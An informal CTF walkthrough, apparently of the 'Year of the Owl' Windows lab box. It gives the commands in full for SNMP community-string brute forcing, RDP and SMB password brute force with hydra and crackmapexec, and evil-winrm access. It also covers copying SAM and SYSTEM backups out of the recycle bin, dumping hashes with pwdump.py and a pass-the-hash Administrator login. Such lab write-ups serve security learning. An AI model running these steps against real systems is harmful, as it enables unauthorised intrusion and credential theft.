first do an nmap scan
	sudo nmap -p- -sC -sV -vv -Pn -A -O 10.10.41.227
We have quite a few open ports
	Discovered open port 3306/tcp on 10.10.41.227
Discovered open port 445/tcp on 10.10.41.227
Discovered open port 443/tcp on 10.10.41.227
Discovered open port 80/tcp on 10.10.41.227
Discovered open port 139/tcp on 10.10.41.227
Discovered open port 3389/tcp on 10.10.41.227

This is going to most likely be a windows machine, due to port 3389 RDP being open
Going to the webpage I only see an owl
I decided to try a directory buster on it while NMAP was still going
When I saw that /licenses was there I decided to try that and did not get anywhere, however, I do know we are using 
	an Apacher Server
	Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10 Server at 10.10.41.227 Port 80
While NMAP was still going I also decided to try and see if we had some stego happening
	sudo apt-get install stegcracker
	wget http://10.10.41.227/owl.jpg
	cp owl.jpg Desktop
NMAP is done and we have the differnet services that are running on each port, that should help us a little... I think 
Other than this I have gotten nowhere, directory buster is not finding anything useful and it doesnt look like we have any stego going on
I do not have a name yet so we are not going to try for RDP bruteforce
Port 443 shows the same as port 80 and that is getting us nowhere
I am not seeing much else, lets try a UDP scan
Still not seeing anything...
Ok... there is nothing here to attack...
	This is a windows Machine, lets try some Windows attacks
After reading some articles it is normal for SNMP to not show up on a port scan, however the service may be running
To figure out if the service is running there are a few different attacks that you can do
	One of those attacks happened to work
https://github.com/trailofbits/onesixtyone
Onesixtyone on github is able to find community strings for SNMP
However, we need a wordlist, I don't know if it comes with one or not
I looked up on github snmp wordlist and found 100 common snmp words
From there I copied them, when to /usr/share/wordlists
mkdir snmp
cd snmp
sudo nano snmp.txt
copied the wordlist
	onesixtyone 10.10.41.227 -c snmp.txt 
Now we have a community string, openview
Lets dump everything 
	snmp-check -c openview 10.10.41.227
Jesus that is a lot of information!!! Time to look through here
Firstly we have a few user accounts, Jareth is one of them the others are pretty default
	I do know from reading about this box that we can use OSINT or we can bruteforce
	We know that windows is going to be running SMB, so we can try to brutefoce that
	We also now that WINRM should be running but we dont even know if we can utilize winrm with our user
I decided to do all three, lets do some Open Source Intelligence and brute force RDP both ways
hydra -l Jareth -P /usr/share/wordlists/rockyou.txt rdp://10.10.41.227
Trying to bruteforce RDP shows that I locked it out... oops maybe I shouldn't have gone soooo hardcore at it
Jareth is the Goblin King in the movie Labyrinth
	There are a couple of words in here that may be the password, such as a womans name (Sarah Williams) and her brothers name
As I was doing this I noticed that crackmapexec smb 10.10.41.227 -u Jareth -p /usr/share/wordlists/rockyou.txt was done
Alright, sure as hell the name is sarah, lets RDP in
ok... or maybe not
Lets us evilwm to find anything else out
	Incase you never download evil-winrm
	sudo gem install evil-winrm
Winrm is a windows remote management tool that can be used for both good and evil, today we are using it for evil
evil-winrm -u Jareth -p sarah -i 10.10.41.227
	we are in, that worked out good
	*Evil-WinRM* PS C:\Users\Jareth\Documents> whoami
		year-of-the-owl\jareth
lets see if there are any hidden files
	attrib -s -h -r /s /d *.*
nothing in there
	cd ..
we need to stick with Jareth because that is the most we have recieved so far, so lets check each directory
	after going into each area and doing a dir search we find what we are looking for in Desktop
Now to find the NTLM hashes, hopefully we have the permissions
cd C:\Windows\System32\config
	dir
	nope... permission denied...
So after a lot of research, and finally just looking it up I learned that we can use an SSID to see the recycling bin, thus allowing us to see if anything was trashed
*Evil-WinRM* PS C:\> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== =============================================
year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001

There is our SSID

cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'

dir

We can see that there are backups of the system and SAM, lets get these out of the recyling bin and back into windows
*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> copy sam.bak C:\Windows\Temp\sam.bak
*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> copy system.bak C:\Windows\Temp\system.bak

*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> download C:\Windows\Temp\sam.bak
Info: Downloading C:\Windows\Temp\sam.bak to sam.bak

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> download C:\Windows\Temp\system.bak

Now that we have this back to the drawning board
I learn that we can use something called pwdump.py to combine files, thus allowing us to make a wordlist off of those files
To use this we need the creddump7 repo and pycrypto on python version 2

git clone https://github.com/Neohapsis/creddump7 && cd creddump7
python2 -m pip install pycrypto

Make sure you do not run anything until system.bak downloads (it is going to take a minute to do)
cd creddump7
python2 pwdump.py ~/system.bak ~/sam.bak > hash.txt

We got our hashes, now we need to crack the NTLM hash using john the ripper
	Trying to crack it again... not getting anywhere
	However above we do have a NTLM hash, which means, if not properly configured
		we could use the LM portion of the hash for a pass the hash
evil-winrm -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a -i 10.10.41.227
That sure as hell works
	Alright last time we were in the desktop, so lets see if admin.txt is in the desktop
	cd ..
	cd Desktop
	dir
	cat admin.txt
